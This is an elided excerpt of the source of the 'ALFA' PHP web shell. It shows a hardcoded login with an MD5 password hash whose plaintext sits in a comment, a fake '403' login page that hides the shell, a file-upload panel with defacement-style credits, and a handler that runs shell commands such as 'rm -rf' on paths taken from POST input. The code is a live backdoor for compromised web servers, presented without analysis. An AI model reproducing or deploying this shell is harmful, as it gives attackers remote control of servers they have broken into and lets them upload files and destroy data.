...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => '0bbc1f69c32b09cea3904d07aaea5b31',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
define("__ALFA_VERSION__", "1.3.3.7");
define("__ALFA_UPDATE__", "2");
define("__ALFA_CODE_NAME__", "catto");
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://i.ibb.co/Gvb5Skmb/download.gif" /></td>
</tr>
<tr>
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ @bboscat &copy; 2019-".date('Y')." ]</span><br><span> <span style='letter-spacing: 2px;color: #dfff00;'>1337 Was Here!</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/pejatenbin'>@pejatenbin</a></span></div></td>
</tr>
</table>
</div>
...
if($GLOBALS["glob_chdir_false"]){
	...
	if($source!='..'&&!empty($source)){
		if(_alfa_can_runCommand(true,true)){alfaEx("cd '".trim(addslashes($_POST['c']))."';rm -rf '".addslashes($source)."'");
		}
	}
}
if(is_array($_POST['f']))
